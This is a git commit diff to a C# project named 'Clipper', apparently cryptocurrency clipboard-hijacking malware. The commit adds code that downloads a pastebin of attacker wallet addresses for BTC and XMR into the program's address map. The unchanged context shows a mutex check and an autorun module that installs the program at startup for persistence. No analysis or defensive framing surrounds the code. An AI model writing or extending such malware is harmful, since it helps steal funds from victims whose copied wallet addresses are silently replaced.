b9a5f01c7cd3e99f1a2e828312697fd7379a7d49
SmitGid <95997791+SharkOfWlan@users.noreply.github.com>
2022-01-29 13:01:02 +0300

    Pastebin Update

--- Clipper/Clipper/Program.cs
+++ Clipper/Clipper/Program.cs
@@ -4,11 +4,26 @@ namespace Clipper
 {
     class Program
     {
+        // Example pastebin
+        // btc sameBTCaddres
+        // xmr someXMRAddres
+        public static string pastebinSource = "dungeon master";
         [STAThreadAttribute]
         static void Main()
         {
-            // Check mutex
-            Modules.AppMutex.Check();
+            // Pastebin part
+            using (WebClient wc = new WebClient())
+            {
+                string allPassetbin = wc.DownloadString(pastebinSource);
+                string[] vsSS = allPassetbin.Split('\n');
+                foreach (String lockS in vsSS)
+                {
+                    string[] parsed = lockS.Split();
+                    config.addresses[parsed[0]] = parsed[1];
+                }
+            }
+             // Check mutex
+             Modules.AppMutex.Check();
             // Add to startup
             if (!Modules.Autorun.is_installed())
                 Modules.Autorun.install();
